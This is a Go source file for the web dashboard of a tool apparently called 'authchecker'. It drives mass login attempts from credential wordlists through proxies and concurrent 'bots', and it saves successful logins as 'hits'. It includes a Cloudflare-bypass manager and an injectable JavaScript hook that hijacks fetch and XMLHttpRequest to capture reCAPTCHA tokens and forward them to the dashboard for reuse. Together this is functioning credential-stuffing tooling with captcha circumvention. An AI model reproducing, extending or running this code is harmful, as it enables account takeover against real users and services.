package web

import (
	"context"
	"embed"
	"encoding/json"
	"fmt"
	"io/fs"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"authchecker/internal/cf"
	"authchecker/internal/config"
	"authchecker/internal/runner"
	"authchecker/internal/storage"
	"time"
)

//go:embed static/*
var staticFS embed.FS

type Server struct {
	addr        string
	configsDir  string
	wordlistsDir string
	resultsDir  string
	db          *storage.DB
	cfManager   *cf.Manager

	mu     sync.Mutex
	engine *runner.Engine
	runID  int64

	lastToken     string
	lastTokenTime time.Time
}

type Options struct {
	Addr         string
	ConfigsDir   string
	WordlistsDir string
	ResultsDir   string
	DB           *storage.DB
	FlareURL     string
}

func New(opts Options) *Server {
	if opts.Addr == "" {
		opts.Addr = ":8080"
	}
	return &Server{
		addr:         opts.Addr,
		configsDir:   opts.ConfigsDir,
		wordlistsDir: opts.WordlistsDir,
		resultsDir:   opts.ResultsDir,
		db:           opts.DB,
		cfManager:    cf.NewManager(opts.FlareURL, 25),
	}
}

func (s *Server) Handler() http.Handler {
	mux := http.NewServeMux()

	static, _ := fs.Sub(staticFS, "static")
	mux.Handle("/", http.FileServer(http.FS(static)))
	mux.HandleFunc("/api/configs", s.handleConfigs)
	mux.HandleFunc("/api/wordlists", s.handleWordlists)
	mux.HandleFunc("/api/run", s.handleRun)
	mux.HandleFunc("/api/stop", s.handleStop)
	mux.HandleFunc("/api/stats", s.handleStats)
	mux.HandleFunc("/api/hits", s.handleHits)
	mux.HandleFunc("/api/test-single", s.handleTestSingle)
	mux.HandleFunc("/api/capture-token", s.handleCaptureToken)
	mux.HandleFunc("/api/last-token", s.handleLastToken)
	mux.HandleFunc("/token-hook.js", s.handleTokenHookJS)

	return mux
}

func (s *Server) handleCaptureToken(w http.ResponseWriter, r *http.Request) {
	setCORS(w)
	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", 405)
		return
	}

	var req struct {
		Token string `json:"token"`
		URL   string `json:"url"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Token == "" {
		jsonError(w, "token required", 400)
		return
	}

	s.mu.Lock()
	s.lastToken = req.Token
	s.lastTokenTime = time.Now()
	s.mu.Unlock()

	fmt.Printf("token captured (%d chars) from %s\n", len(req.Token), req.URL)
	jsonOK(w, map[string]interface{}{"ok": true, "length": len(req.Token)})
}

func (s *Server) handleLastToken(w http.ResponseWriter, r *http.Request) {
	s.mu.Lock()
	token := s.lastToken
	captured := s.lastTokenTime
	s.mu.Unlock()

	age := int64(0)
	if !captured.IsZero() {
		age = int64(time.Since(captured).Seconds())
	}
	jsonOK(w, map[string]interface{}{
		"token":      token,
		"length":     len(token),
		"age_sec":    age,
		"captured_at": captured.Format(time.RFC3339),
	})
}

func (s *Server) handleTokenHookJS(w http.ResponseWriter, r *http.Request) {
	setCORS(w)
	w.Header().Set("Content-Type", "application/javascript")
	fmt.Fprint(w, tokenHookScript())
}

func setCORS(w http.ResponseWriter) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
}

func tokenHookScript() string {
	return `(function(){
  if(window.__authCheckerHook)return;
  window.__authCheckerHook=true;
  const API='http://localhost:8080/api/capture-token';
  function send(url,body){
    try{
      const j=typeof body==='string'?JSON.parse(body):body;
      const t=j&&(j.recaptchaToken||j['g-recaptcha-response']);
      if(!t)return;
      fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({token:t,url:url||location.href})});
      try{navigator.clipboard.writeText(t);}catch(e){}
      console.log('[AuthChecker] token sent to dashboard ('+t.length+' chars)');
    }catch(e){}
  }
  const _fetch=window.fetch;
  window.fetch=function(input,init){
    const url=typeof input==='string'?input:(input&&input.url)||'';
    if(init&&init.body)send(url,init.body);
    return _fetch.apply(this,arguments);
  };
  const _open=XMLHttpRequest.prototype.open;
  const _send=XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open=function(m,u){this._hookUrl=u;return _open.apply(this,arguments);};
  XMLHttpRequest.prototype.send=function(body){if(body)send(this._hookUrl,body);return _send.apply(this,arguments);};
  alert('AuthChecker hook active! Ab login submit karo — token auto dashboard par jayega.');
})();`
}

func (s *Server) ListenAndServe() error {
	fmt.Printf("Dashboard: http://localhost%s\n", s.addr)
	return http.ListenAndServe(s.addr, s.Handler())
}

func (s *Server) handleConfigs(w http.ResponseWriter, r *http.Request) {
	names, err := config.ListConfigs(s.configsDir)
	if err != nil {
		jsonError(w, err.Error(), 500)
		return
	}
	jsonOK(w, names)
}

func (s *Server) handleWordlists(w http.ResponseWriter, r *http.Request) {
	names, err := listFiles(s.wordlistsDir, ".txt")
	if err != nil {
		jsonError(w, err.Error(), 500)
		return
	}
	jsonOK(w, names)
}

func listFiles(dir, ext string) ([]string, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil, err
	}
	var names []string
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		if strings.HasSuffix(e.Name(), ext) {
			names = append(names, e.Name())
		}
	}
	return names, nil
}

type runRequest struct {
	Config    string `json:"config"`
	Wordlist  string `json:"wordlist"`
	ProxyFile string `json:"proxy_file"`
	MaxBots   int    `json:"max_bots"`
}

func (s *Server) handleRun(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", 405)
		return
	}

	s.mu.Lock()
	if s.engine != nil && s.engine.IsRunning() {
		s.mu.Unlock()
		jsonError(w, "already running", 400)
		return
	}
	s.mu.Unlock()

	var req runRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "bad request", 400)
		return
	}

	cfgPath := config.ConfigPath(s.configsDir, req.Config)
	cfg, err := config.Load(cfgPath)
	if err != nil {
		jsonError(w, err.Error(), 400)
		return
	}

	wordlistPath := filepath.Join(s.wordlistsDir, req.Wordlist)
	proxies, _ := runner.LoadProxies(req.ProxyFile)

	var cfMgr *cf.Manager
	if cfg.Cloudflare.Enabled {
		cfMgr = s.cfManager
	}

	engine := runner.NewEngine(cfg, cfMgr, req.MaxBots)
	engine.SetOnHit(func(hit runner.CheckResult) {
		_ = s.db.SaveHit(cfg.Name, hit)
	})

	s.mu.Lock()
	s.engine = engine
	s.mu.Unlock()

	runID, _ := s.db.StartRun(cfg.Name, req.Wordlist, 0)

	go func() {
		ctx := context.Background()
		err := engine.Run(ctx, wordlistPath, proxies)
		stats := engine.Stats()
		_ = s.db.FinishRun(runID, int(stats.Hits))

		s.mu.Lock()
		s.runID = runID
		s.mu.Unlock()

		if err != nil {
			fmt.Printf("run error: %v\n", err)
		}
	}()

	jsonOK(w, map[string]string{"status": "started"})
}

func (s *Server) handleStop(w http.ResponseWriter, r *http.Request) {
	s.mu.Lock()
	if s.engine != nil {
		s.engine.Stop()
	}
	s.mu.Unlock()
	jsonOK(w, map[string]string{"status": "stopped"})
}

func (s *Server) handleStats(w http.ResponseWriter, r *http.Request) {
	s.mu.Lock()
	engine := s.engine
	s.mu.Unlock()

	if engine == nil {
		jsonOK(w, runner.Stats{})
		return
	}
	jsonOK(w, engine.Stats())
}

func (s *Server) handleHits(w http.ResponseWriter, r *http.Request) {
	hits, err := s.db.ListHits(200)
	if err != nil {
		jsonError(w, err.Error(), 500)
		return
	}
	live := []runner.CheckResult{}
	s.mu.Lock()
	if s.engine != nil {
		live = s.engine.Results()
	}
	s.mu.Unlock()

	jsonOK(w, map[string]interface{}{
		"saved": hits,
		"live":  live,
	})
}

type testRequest struct {
	Config          string `json:"config"`
	Email           string `json:"email"`
	Password        string `json:"password"`
	Proxy           string `json:"proxy"`
	RecaptchaToken  string `json:"recaptcha_token"`
}

func (s *Server) handleTestSingle(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", 405)
		return
	}

	var req testRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "bad request", 400)
		return
	}

	cfg, err := config.Load(config.ConfigPath(s.configsDir, req.Config))
	if err != nil {
		jsonError(w, err.Error(), 400)
		return
	}

	var cfMgr *cf.Manager
	if cfg.Cloudflare.Enabled {
		cfMgr = s.cfManager
	}

	bot := runner.NewBot(cfg, cfMgr)
	result := bot.Check(context.Background(), runner.CheckInput{
		Email:          req.Email,
		Password:       req.Password,
		ProxyURL:       req.Proxy,
		RecaptchaToken: req.RecaptchaToken,
	})

	jsonOK(w, result)
}

func jsonOK(w http.ResponseWriter, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(data)
}

func jsonError(w http.ResponseWriter, msg string, code int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	_ = json.NewEncoder(w).Encode(map[string]string{"error": msg})
}
